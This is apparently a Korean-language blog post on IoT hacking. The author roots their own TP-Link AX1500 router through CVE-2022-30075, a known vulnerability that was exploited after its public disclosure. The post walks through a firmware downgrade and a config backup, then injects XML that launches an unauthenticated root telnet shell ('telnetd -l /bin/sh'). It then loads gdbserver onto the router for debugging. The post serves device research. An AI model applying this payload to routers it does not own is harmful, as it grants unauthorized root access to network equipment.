---
title: "TP-Link AX1500 1-day를 이용한 Shell 획득"
date: 2025-01-18 +0900
categories: [Hacking, IoT]
tags: ['iot', 'firmware', '1-day', 'uart']
image:
    path: "/assets/img/posts/2025-01-18-TP-Link-AX1500-1-day를-이용한-Shell-획득/image2.png"
    alt: "Get Shell"
    lqip: "/assets/img/posts/2025-01-18-TP-Link-AX1500-1-day를-이용한-Shell-획득/image2.png"
---

TP-Link AX1500 공유기의 쉘을 얻기 위한 마지막 방법인 **1-day exploit**를 이용한 방법입니다.

1. ~~Firmware Update 페이지~~ ❌
2. ~~CFE Console~~ 🤔
3. ~~UART를 통한 Shell 획득~~ ❌
4. **1-day를 이용한 Shell 획득**

## CVE-2022-30075

> https://github.com/gmaxus/TP-Link-Archer-AX1500-telnet-root/blob/main/README-eng.md
> https://github.com/aaronsvk/CVE-2022-30075

### 1.펌웨어 버전 다운그레이드
먼저 해당 취약점이 패치되기 전의 펌웨어로 다운그레이드가 필요합니다. 펌웨어 업그레이드 페이지에서 이전 버전의 펌웨어 파일을 업로드하고 "UPDATE" 버튼을 누르면 다운그레이드가 완료됩니다.
![alt text](/assets/img/posts/2025-01-18-TP-Link-AX1500-1-day를-이용한-Shell-획득/image.png)

### 2.현재 펌웨어 구성요소 백업
`python tplink.py -t 192.168.0.1 -p <password> -b` 를 실행하여 현재 펌웨어에 대한 구성 요소를 백업합니다.(`ori-backup-user-config.xml` 로 저장됨.)

### 3.태그 추가
`ori-backup-user-config.xml` 에 다음과 같은 태그를 추가해준다.
    
```xml
<button name="exploit">
<action>released</action>
<max>1999</max>
<handler>/usr/sbin/telnetd -l /bin/sh</handler>
<min>0</min>
<button>wifi</button>
</button>
```

```xml
<service name="exploit">
<ip_script>/usr/sbin/telnetd -l /bin/sh</ip_script>
<username>X</username>
<retry_unit>seconds</retry_unit>
<check_interval>12</check_interval>
<interface>internet</interface>
<enabled>on</enabled>
<force_unit>days</force_unit>
<check_unit>hours</check_unit>
<domain>x.example.org</domain>
<password>X</password>
<retry_interval>5</retry_interval>
<ip_source>script</ip_source>
<update_url>http://127.0.0.1/</update_url>
<force_interval>30</force_interval>
<retry_times>3</retry_times>
</service>
```
    
### 4.변경된 구성파일을 업로드
`python tplink.py -t 192.168.0.1 -p <password> -r ./ArcherAX10v120230220134n` 을 실행하여 구성파일을 업로드한다.

### 5. telnet 실행
`telnet 192.168.0.1` 실행

![alt text](/assets/img/posts/2025-01-18-TP-Link-AX1500-1-day를-이용한-Shell-획득/image2.png)

## 원격 디버깅
telnet 구동을 통해 원격으로 shell에 접근할 수 있기 때문에 실제 라우터에서 동작하는 바이너리를 분석할 수 있도록 gdbserver나 strace 등을 설치해야합니다.<br>

그러나 rootfs에 직접 write할 수 없기 때문에 `/tmp` 폴더에 설치해야합니다.

arm 아키텍처에 대한 gdbserver와 strace의 바이너리는 아래의 github repository에서 얻을 수 있습니다.
> https://github.com/therealsaumil/static-arm-bins/tree/master

1. tftp를 이용하여 로컬에서 tp-link로 파일 전송
```shell
tftp -r gdbserver-armel-static-8.0.1 -g 192.168.0.100
```

![alt text](/assets/img/posts/2025-01-18-TP-Link-AX1500-1-day를-이용한-Shell-획득/image3.png)

2. gdbserver 실행
```shell
./gdbserver-armel-static-8.0.1 :8888 --attach 7608
```
![alt text](/assets/img/posts/2025-01-18-TP-Link-AX1500-1-day를-이용한-Shell-획득/image4.png)